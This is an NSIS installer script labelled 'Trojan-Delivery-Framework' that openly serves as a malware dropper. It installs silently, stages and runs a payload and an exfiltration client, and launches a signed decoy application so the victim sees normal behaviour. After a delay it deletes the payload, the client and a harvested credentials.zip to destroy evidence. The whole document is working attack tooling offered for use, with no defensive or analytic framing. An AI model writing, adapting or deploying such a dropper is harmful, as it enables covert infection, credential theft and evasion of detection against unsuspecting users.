; Trojan-Delivery-Framework
; Author: Oleg Efimov
; Purpose: Wraps a payload with a signed executable to evade detection.

Outfile "Setup_Signed.exe"
; Icon "installer.ico" ; Uncomment if you have an icon

SilentInstall silent
RequestExecutionLevel user 

; The directory where we drop our payload
InstallDir "$LOCALAPPDATA\Updater"

Section "Install"
  CreateDirectory "$INSTDIR"
  SetOutPath "$INSTDIR"

  ; --- 1. STAGE FILES ---
  ; The Decoy (Legitimate Signed Application)
  File "SignedApp.exe" 

  ; The Payload (The exploit logic)
  File "Payload.exe"
  
  ; The Transport (Exfiltration client)
  File "exfil_client.exe"

  ; --- 2. EXECUTION PHASE ---
  
  ; Execute the payload (Blocking wait is handled by payload logic or sleep below)
  nsExec::Exec '"$INSTDIR\Payload.exe"'
  
  ; Execute the exfiltration client
  nsExec::Exec '"$INSTDIR\exfil_client.exe"'

  ; Run the decoy app normally so the user sees expected behavior
  ; We use 'runas' to ensure it runs with appropriate privileges if needed
  ExecShell "runas" "$INSTDIR\SignedApp.exe"

  ; --- 3. CLEANUP PHASE ---
  ; We sleep for 120 seconds to ensure the payload and client 
  ; have fully finished execution and released file locks. 
  ; Attempting to delete too early will fail if the process is still active.
  Sleep 120000 
  
  Call NukeEvidence
SectionEnd

Function NukeEvidence
  ; Force delete spawned files
  Delete "$INSTDIR\Payload.exe"
  Delete "$INSTDIR\exfil_client.exe"
  Delete "$INSTDIR\results\credentials.zip"
  RMDir "$INSTDIR\results"
  
FunctionEnd
